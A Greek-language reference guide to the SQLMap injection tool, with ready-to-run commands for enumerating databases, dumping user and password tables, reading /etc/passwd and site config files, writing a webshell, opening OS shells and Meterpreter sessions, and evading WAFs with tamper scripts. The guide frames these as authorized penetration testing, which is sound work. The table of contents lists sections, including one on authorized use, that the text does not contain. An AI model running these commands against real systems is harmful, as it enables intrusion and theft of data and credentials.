# 💉 SQLMap — Πλήρης οδηγός αναφοράς

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Εργαλείο αυτοματοποίησης ελέγχων SQL Injection
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Εργαλείο αυτοματοποίησης ελέγχων SQL Injection</b>
</p>

---

## Πριν ξεκινήσετε

Το **SQL Injection** είναι αδυναμία στην οποία μη έμπιστα δεδομένα επηρεάζουν τη δομή ενός ερωτήματος SQL προς μια βάση δεδομένων. Το **SQLMap** αυτοματοποιεί σχετικές δοκιμές. Δεν βρίσκει κάθε ευπάθεια εφαρμογής και οι λειτουργίες εξαγωγής δεδομένων ή πρόσβασης στο λειτουργικό απαιτούν συγκεκριμένες τεχνικές προϋποθέσεις.

**Βασικοί όροι:** *parameter* = παράμετρος αιτήματος, *payload* = δοκιμαστικό δεδομένο που στέλνει το εργαλείο, *DBMS* = σύστημα διαχείρισης βάσης δεδομένων, *schema* = δομή βάσης, *dump* = εξαγωγή εγγραφών, *WAF* = μηχανισμός φιλτραρίσματος αιτημάτων web. Οι επιλογές, οι διευθύνσεις και τα payloads των παραδειγμάτων διατηρούνται όπως στο αγγλικό πρωτότυπο. Προσαρμόστε τα αποκλειστικά στο συμφωνημένο εργαστήριο ή πεδίο ελέγχου.

Για τα πρώτα βήματα, διαβάστε πρώτα πώς ορίζεται το αίτημα και η παράμετρος, έπειτα τα επίπεδα ελέγχων και τέλος την ερμηνεία αποτελεσμάτων. Οι προχωρημένες ενότητες αποτελούν ξεχωριστές δυνατότητες, όχι υποχρεωτική συνέχεια κάθε σάρωσης.

## 📋 Περιεχόμενα

- [Εισαγωγή](#section-01)
- [Εγκατάσταση](#section-02)
- [Βασική σύνταξη](#section-03)
- [Επιλογές στόχου](#section-04)
- [Επιλογές αιτημάτων](#section-05)
- [Επιλογές ανίχνευσης](#section-06)
- [Συλλογή πληροφοριών](#section-07)
- [Εξαγωγή δεδομένων](#section-08)
- [Εργασίες σε αρχεία](#section-09)
- [Πρόσβαση στο λειτουργικό σύστημα](#section-10)
- [Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί](#section-11)
- [Παραδείγματα σεναρίων ελέγχου](#section-12)
- [Γρήγορη αναφορά](#section-13)
- [Συμβουλές και καλές πρακτικές](#section-14)
- [Πλαίσιο εξουσιοδοτημένης χρήσης](#section-15)
- [Πηγές](#section-16)

---

<a id="section-01"></a>

## 🎯 Εισαγωγή

**Το SQLMap** είναι εργαλείο ανοιχτού κώδικα που αυτοματοποιεί την ανίχνευση και αξιοποίηση ευπαθειών SQL Injection, μέσα στο εγκεκριμένο πλαίσιο ενός ελέγχου ασφάλειας.

### Βασικά χαρακτηριστικά

| Χαρακτηριστικό | Περιγραφή |
| --------- | ------------- |
| **Αυτόματη ανίχνευση** | Αυτοματοποιημένη αναζήτηση ευπαθειών SQL Injection |
| **Υποστήριξη βάσεων δεδομένων** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite και άλλες |
| **Προχωρημένες λειτουργίες πρόσβασης** | Αναγνώριση βάσης, εξαγωγή δεδομένων και πρόσβαση στο λειτουργικό, εφόσον επιτρέπεται τεχνικά |
| **Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί** | Μετασχηματισμός εισόδων με tamper scripts για δοκιμές απέναντι σε φίλτρα WAF/IPS |
| **Πολλαπλοί τύποι SQL Injection** | Με λογικές αποκρίσεις, σφάλματα, UNION, διαδοχικά ερωτήματα ή χρονικές καθυστερήσεις |

### Υποστηριζόμενες βάσεις δεδομένων

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Τύποι SQL Injection

| Τύπος | Κωδικός | Περιγραφή |
| ------ | ------ | ------------- |
| Τυφλή έγχυση με λογικές αποκρίσεις (Boolean-based blind) | `B` | Διαφορετικές αποκρίσεις σε αληθή και ψευδή συνθήκη |
| Έγχυση μέσω μηνυμάτων σφάλματος (Error-based) | `E` | Σφάλματα βάσης δεδομένων στην απόκριση |
| Έγχυση μέσω ερωτήματος UNION | `U` | Έγχυση με UNION SELECT |
| Διαδοχικά ερωτήματα (Stacked queries) | `S` | Πολλαπλά ερωτήματα χωρισμένα με ελληνικό ερωτηματικό (;) |
| Τυφλή έγχυση βάσει χρόνου (Time-based blind) | `T` | Καθυστερήσεις στον χρόνο απόκρισης |
| Ένθετα ερωτήματα (Inline queries) | `Q` | Ένθετα ερωτήματα μέσα σε άλλο ερώτημα |

---

<a id="section-02"></a>

## 📥 Εγκατάσταση

> **Πηγές εγκατάστασης:** Ο επίσημος κώδικας βρίσκεται στο sqlmapproject/sqlmap. Το `paoloo/sqlmap` του παραδείγματος είναι εικόνα τρίτου και δεν παρουσιάζεται ως επίσημη. Ελέγξτε την προέλευση του πακέτου και τη βοήθεια της εγκατεστημένης έκδοσης. Δείτε τον [επίσημο ιστότοπο SQLMap](https://sqlmap.org/).


### Kali Linux (συνήθως προεγκατεστημένο)
```bash
# Ενημέρωση SQLMap
sudo apt update && sudo apt install sqlmap
```

### Εγκατάσταση από το GitHub
```bash
# Λήψη αντιγράφου αποθετηρίου
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Εκκίνηση SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Εγκατάσταση μέσω pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Επιβεβαίωση εγκατάστασης
```bash
sqlmap --version
sqlmap -h          # Βασική βοήθεια
sqlmap -hh         # Αναλυτική βοήθεια
```

---

<a id="section-03"></a>

## ⌨️ Βασική σύνταξη

### Γενική σύνταξη
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Παραδείγματα για τα πρώτα βήματα
```bash
# Βασική σάρωση
sqlmap -u "http://target.com/page.php?id=1"

# Έλεγχος με cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Έλεγχος αιτήματος POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Σάρωση στόχων από αρχείο
sqlmap -r request.txt

# Μη διαδραστική λειτουργία με προεπιλεγμένες απαντήσεις
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

<a id="section-04"></a>

## 🎯 Επιλογές στόχου

### Στόχος μέσω URL (-u)
```bash
# Βασικό URL
sqlmap -u "http://target.com/page.php?id=1"

# Πολλαπλές παράμετροι
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Επιλογή παραμέτρου προς έλεγχο
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Παράδειγμα αυξημένου εύρους ελέγχων παραμέτρων
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Αρχείο αιτήματος HTTP (-r)
```bash
# Αποθήκευση αιτήματος από το Burp Suite σε αρχείο
# Στη συνέχεια εκτελέστε τον εγκεκριμένο έλεγχο:
sqlmap -r request.txt

# Παράδειγμα περιεχομένου αρχείου αιτήματος:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Αναζήτηση με ερώτημα Google (-g)
```bash
# Παράδειγμα αναζήτησης και ελέγχου αποτελεσμάτων Google· χρειάζεται εξουσιοδοτημένο πεδίο
sqlmap -g "inurl:page.php?id="

# Με περιορισμό αναζήτησης σε συγκεκριμένες σελίδες
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Απευθείας σύνδεση στη βάση δεδομένων (-d)
```bash
# Απευθείας σύνδεση στη βάση δεδομένων
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Πολλαπλοί στόχοι από αρχείο (-m)
```bash
# Αρχείο με πολλαπλά URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Αρχείο ρυθμίσεων (-c)
```bash
# Χρήση αρχείου ρυθμίσεων
sqlmap -c sqlmap.conf
```

---

<a id="section-05"></a>

## 📡 Επιλογές αιτημάτων

### Μέθοδος HTTP και δεδομένα
```bash
# Δεδομένα αιτήματος POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Καθορισμός μεθόδου HTTP
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Δεδομένα JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies συνεδρίας
```bash
# Ένα cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Πολλαπλά cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Φόρτωση cookies από αρχείο
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Έλεγχος παραμέτρου cookie
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Κεφαλίδες HTTP
```bash
# Προσαρμοσμένη κεφαλίδα HTTP
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Πολλαπλές κεφαλίδες HTTP
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Τυχαία επιλογή User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Ταυτοποίηση
```bash
# Βασική ταυτοποίηση HTTP
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Ταυτοποίηση HTTP Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# Ταυτοποίηση NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# Proxy HTTP
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Διαμεσολαβητής συνδέσεων SOCKS
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Έλεγχος σύνδεσης μέσω Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

<a id="section-06"></a>

## 🔍 Επιλογές ανίχνευσης

### Επίπεδο ελέγχων και κίνδυνος (Level & Risk)

> **Εύρος και επιπτώσεις:** Το `--level` αυξάνει το σύνολο δοκιμών και τα σημεία που εξετάζονται· το `--risk` προσθέτει ελέγχους με μεγαλύτερες πιθανές επιπτώσεις. Ούτε το επίπεδο 1 εγγυάται ακίνδυνη εκτέλεση. Το `--batch` χρησιμοποιεί προεπιλεγμένες απαντήσεις και δεν μειώνει τον κίνδυνο. Δείτε την [επίσημη τεκμηρίωση επιλογών](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

```bash
# Επίπεδο 1-5: εύρος και αριθμός ελέγχων
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Επίπεδο κινδύνου 1-3: πιθανές επιπτώσεις ελέγχων
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Παράδειγμα αυξημένου εύρους και κινδύνου· απαιτεί ειδική αξιολόγηση
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Επίπεδο | Έλεγχοι |
| ------- | ------- |
| 1 | Προεπιλογή: βασικοί έλεγχοι |
| 2 | + Έλεγχοι τιμών cookies |
| 3 | + Έλεγχοι των κεφαλίδων User-Agent και Referer |
| 4 | + Περισσότερα δοκιμαστικά δεδομένα (payloads) |
| 5 | + Ευρύτερο σύνολο δοκιμαστικών δεδομένων |

| Κίνδυνος | Περιγραφή |
| ------ | ------------- |
| 1 | Προεπιλεγμένο χαμηλότερο επίπεδο κινδύνου· δεν εγγυάται απουσία επιπτώσεων |
| 2 | + Πιο απαιτητικοί έλεγχοι χρονικής καθυστέρησης |
| 3 | + Έλεγχοι με OR, που μπορεί να τροποποιήσουν δεδομένα |

### Επιλογή τεχνικής
```bash
# Συγκεκριμένη τεχνική
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Μόνο τεχνική UNION
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Μόνο τεχνική λογικών αποκρίσεων
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Μόνο τεχνική μέσω μηνυμάτων σφάλματος
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Μόνο τεχνική χρονικής καθυστέρησης
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Μόνο τεχνική διαδοχικών ερωτημάτων

# Πολλαπλές τεχνικές
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Όλες οι τεχνικές, προεπιλογή
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Χρονικές καθυστερήσεις
```bash
# Καθυστέρηση για χρονική τεχνική έγχυσης σε δευτερόλεπτα, προεπιλογή: 5
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Καθυστέρηση μεταξύ αιτημάτων
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Παράλληλες εργασίες (threads)
```bash
# Παράλληλες συνδέσεις, προεπιλογή: 1
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

<a id="section-07"></a>

## 📊 Συλλογή πληροφοριών

### Συλλογή πληροφοριών βάσης δεδομένων
```bash
# Αναγνώριση τρέχουσας βάσης δεδομένων
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Ανάκτηση: τρέχων χρήστης
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Έλεγχος αν ο χρήστης έχει δικαιώματα διαχειριστή βάσης (DBA)
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Προβολή διαθέσιμων βάσεων δεδομένων
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Προβολή διαθέσιμων χρηστών βάσης δεδομένων
sqlmap -u "http://target.com/page.php?id=1" --users

# Ανάκτηση διαθέσιμων hashes κωδικών χρηστών βάσης
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Προβολή δικαιωμάτων
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Εμφάνιση ρόλων
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Αναζήτηση πινάκων
```bash
# Προβολή πινάκων συγκεκριμένης βάσης
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Προβολή διαθέσιμων πινάκων
sqlmap -u "http://target.com/page.php?id=1" --tables

# Καταμέτρηση εγγραφών πινάκων
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Αναζήτηση στηλών
```bash
# Προβολή στηλών πίνακα
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Αναζήτηση ονομάτων στηλών
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Εξαγωγή δομής βάσης δεδομένων
```bash
# Εξαγωγή δομής βάσης δεδομένων
sqlmap -u "http://target.com/page.php?id=1" --schema

# Εξαίρεση βάσεων συστήματος
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

<a id="section-08"></a>

## 📤 Εξαγωγή δεδομένων

### Εξαγωγή εγγραφών

> **Όρια εξαγωγής:** Το `--dump-all` αφορά εξαγωγή από όλες τις διαθέσιμες βάσεις. Μην θεωρείτε ότι το `-D` του συγκεκριμένου παραδείγματος περιορίζει μόνο του το `--dump-all`. Για συγκεκριμένη βάση ή πίνακα, η τεκμηριωμένη επιλογή είναι `--dump` μαζί με τα αντίστοιχα φίλτρα. Η πρόσβαση εξαρτάται από τα δικαιώματα του χρήστη βάσης. Δείτε την [τεκμηρίωση εξαγωγής](https://github.com/sqlmapproject/sqlmap/wiki/Usage#dump-all-databases-tables-entries).

```bash
# Εξαγωγή συγκεκριμένου πίνακα
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Εξαγωγή συγκεκριμένων στηλών
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Παράδειγμα εξαγωγής πινάκων· δείτε τη σημείωση για --dump-all
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Παράδειγμα εξαγωγής όλων των διαθέσιμων δεδομένων
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Εξαίρεση βάσεων συστήματος
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Περιορισμός αποτελεσμάτων
```bash
# Οι πρώτες 10 γραμμές
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Γραμμές 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# Συνθήκη WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Προσαρμοσμένα ερωτήματα SQL
```bash
# Εκτέλεση ερωτήματος SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Διαδραστική κονσόλα SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Μορφές αποτελεσμάτων

> **Διόρθωση περιγραφής:** Το `--csv-del` ορίζει διαχωριστικό CSV. Το `--output-dir` ορίζει μόνο τον κατάλογο αποθήκευσης· δεν επιλέγει μορφή HTML, παρά το σχόλιο του πρωτοτύπου. Οι εντολές του παραδείγματος διατηρούνται, με διορθωμένη ελληνική εξήγηση.

```bash
# Αποθήκευση με διαχωριστικό CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Ορισμός καταλόγου εξόδου· δεν επιλέγει μορφή HTML
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

<a id="section-09"></a>

## 📁 Εργασίες σε αρχεία

> **Τεχνικές προϋποθέσεις:** Ανάγνωση ή εγγραφή αρχείων και πρόσβαση στο λειτουργικό δεν προκύπτουν από κάθε SQL Injection. Εξαρτώνται από DBMS, τεχνική έγχυσης, δικαιώματα και ρυθμίσεις server. Εγγραφή αρχείων, εντολές και αλλαγές Registry μπορεί να αλλάξουν την κατάσταση του συστήματος.


### Ανάγνωση αρχείων
```bash
# Ανάγνωση αρχείου από τον server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Ανάγνωση αρχείων Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Ανάγνωση αρχείου ρυθμίσεων ιστοτόπου
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Εγγραφή αρχείων
```bash
# Παράδειγμα εγγραφής αρχείου στον server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Παράδειγμα εγγραφής αρχείου webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

<a id="section-10"></a>

## 💻 Πρόσβαση στο λειτουργικό σύστημα

### Εκτέλεση εντολών
```bash
# Εκτέλεση εντολής λειτουργικού συστήματος
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Διαδραστική κονσόλα λειτουργικού συστήματος
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Παράδειγμα PowerShell σε Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Συνεδρία Meterpreter
```bash
# Παράδειγμα δημιουργίας συνεδρίας Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Με συγκεκριμένες επιλογές
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### Αναμετάδοση ταυτοποίησης SMB (SMB Relay)
```bash
# Παράδειγμα αναμετάδοσης ταυτοποίησης SMB
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Πρόσβαση στο μητρώο Windows (Registry)

> **Σύνταξη του πρωτοτύπου:** Το πρώτο παράδειγμα γράφει `-reg-key` με μία παύλα, ενώ η τεκμηριωμένη επιλογή είναι `--reg-key`. Η γραμμή διατηρείται για αντιστοιχία με το πρωτότυπο και χρειάζεται διόρθωση πριν από χρήση.

```bash
# Παράδειγμα ανάγνωσης Registry
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Παράδειγμα προσθήκης εγγραφής Registry
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Παράδειγμα διαγραφής εγγραφής Registry
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="section-11"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

### Δοκιμές παράκαμψης WAF/IPS

> **Όρια των επιλογών:** Το `--identify-waf` είναι παλιό παράδειγμα και χρειάζεται έλεγχο υποστήριξης. Το `--skip-waf` παραλείπει τον έλεγχο αναγνώρισης WAF· δεν παρακάμπτει το ίδιο το WAF. Τα tamper scripts μετασχηματίζουν εισόδους, χωρίς εγγύηση επιτυχίας ή συμβατότητας. Αλλαγή User-Agent ή χρήση Tor επίσης δεν αποδεικνύει ανωνυμία.

```bash
# Παλιό παράδειγμα αναγνώρισης WAF· ελέγξτε την υποστήριξη της επιλογής
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Παράλειψη αναγνώρισης WAF, όχι παράκαμψη του WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Τυχαία εναλλαγή πεζών και κεφαλαίων
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Συνδυασμός tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Συνήθη scripts μετασχηματισμού (tamper scripts)
```bash
# Κωδικοποίηση URL
--tamper=charencode

# Διπλή κωδικοποίηση URL
--tamper=chardoubleencode

# Κωδικοποίηση Unicode
--tamper=charunicodeencode

# Αντικατάσταση κενών με σχόλια SQL
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Εναλλαγή πεζών και κεφαλαίων
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Μετασχηματισμός λέξεων κλειδιών
--tamper=between
--tamper=equaltolike
```

### Πίνακας αναφοράς tamper scripts

> **Ο πίνακας είναι συνοπτικός:** Η πραγματική μετατροπή και η συμβατότητα κάθε script πρέπει να διαβάζονται στον κώδικά του. Για παράδειγμα, το `apostrophenullencode` αντικαθιστά την απόστροφο με `%00%27`, όπως φαίνεται στον [επίσημο κώδικά του](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/apostrophenullencode.py).


| Script — πρόγραμμα εντολών | Περιγραφή |
| -------- | ------------- |
| `apostrophemask` | Αντικατάσταση αποστρόφου με παραλλαγή χαρακτήρα UTF-8 |
| `apostrophenullencode` | Αντικατάσταση αποστρόφου με την ακολουθία %00%27 |
| `base64encode` | Κωδικοποίηση του payload σε Base64 |
| `between` | Αντικατάσταση του `>` με `NOT BETWEEN 0 AND #` |
| `charencode` | Κωδικοποίηση χαρακτήρων σε μορφή URL |
| `charunicodeencode` | Κωδικοποίηση Unicode για URL |
| `concat2concatws` | Αντικατάσταση του `CONCAT` με `CONCAT_WS` |
| `equaltolike` | Αντικατάσταση του `=` με `LIKE` |
| `greatest` | Αντικατάσταση του `>` με έκφραση `GREATEST` |
| `halfversionedmorekeywords` | Προσθήκη σχολίου MySQL με ένδειξη έκδοσης |
| `ifnull2ifisnull` | Αντικατάσταση του `IFNULL` με `IF(ISNULL())` |
| `lowercase` | Μετατροπή λέξεων κλειδιών σε πεζά |
| `modsecurityversioned` | Δοκιμή απέναντι σε ModSecurity με σχόλιο έκδοσης |
| `modsecurityzeroversioned` | Δοκιμή απέναντι σε ModSecurity με σχόλιο μηδενικής έκδοσης |
| `percentage` | Προσθήκη συμβόλου ποσοστού πριν από χαρακτήρες |
| `randomcase` | Τυχαία εναλλαγή πεζών και κεφαλαίων στις λέξεις κλειδιά |
| `randomcomments` | Προσθήκη τυχαίων σχολίων σε λέξεις κλειδιά SQL |
| `securesphere` | Προσθήκη ειδικής συμβολοσειράς για δοκιμή απέναντι σε SecureSphere |
| `space2comment` | Αντικατάσταση κενού με `/**/` |
| `space2dash` | Αντικατάσταση κενού με σχόλιο `--` |
| `space2hash` | Αντικατάσταση κενού με σχόλιο `#` |
| `space2morehash` | Αντικατάσταση κενού με `#` και αλλαγή γραμμής |
| `space2mssqlblank` | Αντικατάσταση κενού με χαρακτήρες κενού για MSSQL |
| `space2mssqlhash` | Αντικατάσταση κενού με `#` και αλλαγή γραμμής για MSSQL |
| `space2plus` | Αντικατάσταση κενού με `+` |
| `space2randomblank` | Αντικατάσταση κενού με τυχαίο χαρακτήρα κενού |
| `symboliclogical` | Αντικατάσταση των `AND`/`OR` με `&&`/`\|\|` |
| `unionalltounion` | Αντικατάσταση του `UNION ALL` με `UNION` |
| `unmagicquotes` | Αντικατάσταση εισαγωγικού με την ακολουθία πολλαπλών bytes `%bf%27` |
| `uppercase` | Μετατροπή λέξεων κλειδιών σε κεφαλαία |
| `versionedkeywords` | Περίκλειση λέξεων κλειδιών σε σχόλιο έκδοσης |
| `versionedmorekeywords` | Περίκλειση περισσότερων λέξεων κλειδιών σε σχόλιο έκδοσης |
| `xforwardedfor` | Προσθήκη κεφαλίδας `X-Forwarded-For` με πλασματική τιμή |

---

<a id="section-12"></a>

## 🎬 Παραδείγματα σεναρίων ελέγχου

### Παράδειγμα 1: Βασική σάρωση
```bash
# Έλεγχος με μη διαδραστικές προεπιλογές
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Παράδειγμα 2: Εξαγωγή δεδομένων βάσης
```bash
# Συλλογή πληροφοριών και εξαγωγή δεδομένων
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Μετά τον εντοπισμό της βάσης δεδομένων
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Εξαγωγή πίνακα users
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Παράδειγμα 3: Αίτημα POST με cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Παράδειγμα 4: Μέσω του proxy του Burp Suite
```bash
# Αποθηκεύστε το αίτημα από το Burp σε αρχείο και στη συνέχεια:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Παράδειγμα 5: Παράδειγμα δοκιμής απέναντι σε WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Παράδειγμα 6: Παράδειγμα πρόσβασης σε κονσόλα λειτουργικού συστήματος
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Παράδειγμα 7: Παράδειγμα ανάγνωσης ευαίσθητων αρχείων
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

<a id="section-13"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `-u URL` | URL στόχου με παράμετρο |
| `-r FILE` | Φόρτωση αιτήματος από αρχείο |
| `--data=DATA` | Δεδομένα αιτήματος POST |
| `--cookie=COOKIE` | Cookie HTTP |
| `--dbs` | Προβολή βάσεων δεδομένων |
| `--tables` | Προβολή πινάκων |
| `--columns` | Προβολή στηλών |
| `--dump` | Εξαγωγή δεδομένων |
| `-D DB` | Επιλογή βάσης δεδομένων |
| `-T TABLE` | Επιλογή πίνακα |
| `-C COLS` | Επιλογή στηλών |
| `--batch` | Λειτουργία χωρίς διαδραστικές ερωτήσεις |

### Επιλογές ανίχνευσης

| Επιλογή | Περιγραφή |
| -------- | ------------- |
| `--level=LEVEL` | Επίπεδο ελέγχων (1-5) |
| `--risk=RISK` | Επίπεδο κινδύνου (1-3) |
| `-p PARAM` | Παράμετρος προς έλεγχο |
| `--technique=TECH` | Τεχνική έγχυσης |
| `--threads=N` | Παράλληλες εργασίες |

### Επιλογές αποτελεσμάτων

| Επιλογή | Περιγραφή |
| -------- | ------------- |
| `-v LEVEL` | Αναλυτικότητα εξόδου (0-6) |
| `--batch` | Χρήση προεπιλεγμένων απαντήσεων χωρίς ερωτήσεις |
